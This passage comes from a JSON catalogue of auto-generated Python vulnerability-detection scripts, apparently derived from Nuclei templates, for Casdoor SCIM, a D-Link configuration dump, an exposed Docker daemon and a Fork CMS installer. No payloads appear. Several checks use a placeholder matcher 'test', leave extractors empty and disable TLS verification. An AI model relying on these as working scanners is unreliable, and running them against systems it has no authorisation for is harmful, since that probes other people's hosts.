re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",\"Resources\", \"emails\"); contains(header,\"casdoor_session_id\") && status_code == 200 / [OR] DSL: contains_all(body,\"urn:ietf:params:scim:schemas:core:2.0:User\",username); status_code == 201 / [OR] DSL: contains_all(body,\"\\\\\"status\\\\\": \\\\\"ok\\\\\"\",\"data\",\"msg\",\"sub\"); status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Casdoor <=v1.811.0 - Unauthenticated SCIM Operations\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_casdoor_unauth_operations(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "casdoor",
          "unauth",
          "intrusive",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_dlink_config_dump",
        "name": "D-Link DAP-1325 - Information Disclosure",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Security vulnerability known as Unauthenticated access to settings or Unauthenticated configuration download. This vulnerability occurs when a device, such as a repeater, allows the download of user settings without requiring proper authentication.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Password' | regex ['filename=\"(.*)_Settings.dat', 'application/octet-stream'] | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dlink-config-dump\nName: D-Link DAP-1325 - Information Disclosure\nSeverity: critical\nDescription: Security vulnerability known as Unauthenticated access to settings or Unauthenticated configuration download. This vulnerability occurs when a device, such as a repeater, allows the download of user settings without requiring proper authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dlink_config_dump:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dlink-config-dump\"\n    SEVERITY = \"critical\"\n    NAME = \"D-Link DAP-1325 - Information Disclosure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'Password\\' | regex [\\'filename=\"(.*)_Settings.dat\\', \\'application/octet-stream\\'] | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['Password', 'filename=\"(.*)_Settings.dat', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"D-Link DAP-1325 - Information Disclosure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dlink_config_dump(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: dlink-config-dump\nName: D-Link DAP-1325 - Information Disclosure\nSeverity: critical\nDescription: Security vulnerability known as Unauthenticated access to settings or Unauthenticated configuration download. This vulnerability occurs when a device, such as a repeater, allows the download of user settings without requiring proper authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_dlink_config_dump:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"dlink-config-dump\"\n    SEVERITY = \"critical\"\n    NAME = \"D-Link DAP-1325 - Information Disclosure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'Password\\' | regex [\\'filename=\"(.*)_Settings.dat\\', \\'application/octet-stream\\'] | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['Password', 'filename=\"(.*)_Settings.dat', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"D-Link DAP-1325 - Information Disclosure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_dlink_config_dump(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "config",
          "dump",
          "dlink",
          "auth-bypass",
          "disclosure",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_docker_daemon_exposed",
        "name": "Docker Daemon Exposed",
        "language": "Python",
        "famille": "Exposure",
        "description": "Docker Daemon exposed on the network map can help remote attacker to gain access to the Docker containers and potentially the host system.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_2 == 200; contains(body_1, \"ApiVersion\") && contains(body_1, \"GitCommit\") && contains(body_1, \"GoVersion\")  && contains(body_1, \"KernelVersion\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: docker-daemon-exposed\nName: Docker Daemon Exposed\nSeverity: critical\nDescription: Docker Daemon exposed on the network map can help remote attacker to gain access to the Docker containers and potentially the host system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_docker_daemon_exposed:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"docker-daemon-exposed\"\n    SEVERITY = \"critical\"\n    NAME = \"Docker Daemon Exposed\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 200; contains(body_1, \"ApiVersion\") && contains(body_1, \"GitCommit\") && contains(body_1, \"GoVersion\")  && contains(body_1, \"KernelVersion\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Docker Daemon Exposed\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_docker_daemon_exposed(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: docker-daemon-exposed\nName: Docker Daemon Exposed\nSeverity: critical\nDescription: Docker Daemon exposed on the network map can help remote attacker to gain access to the Docker containers and potentially the host system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_docker_daemon_exposed:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"docker-daemon-exposed\"\n    SEVERITY = \"critical\"\n    NAME = \"Docker Daemon Exposed\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 200; contains(body_1, \"ApiVersion\") && contains(body_1, \"GitCommit\") && contains(body_1, \"GoVersion\")  && contains(body_1, \"KernelVersion\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Docker Daemon Exposed\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_docker_daemon_exposed(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "docker",
          "exposure",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_fork_installer",
        "name": "Fork CMS - Installer",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Fork CMS installer page was detected.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Install Fork CMS, Settings' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: fork-installer\nName: Fork CMS - Installer\nSeverity: critical\nDescription: Fork CMS installer page was detected.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_fork_installer:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"fork-installer\"\n    SEVERITY = \"critical\"\n    NAME = \"Fork CMS - Installer\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        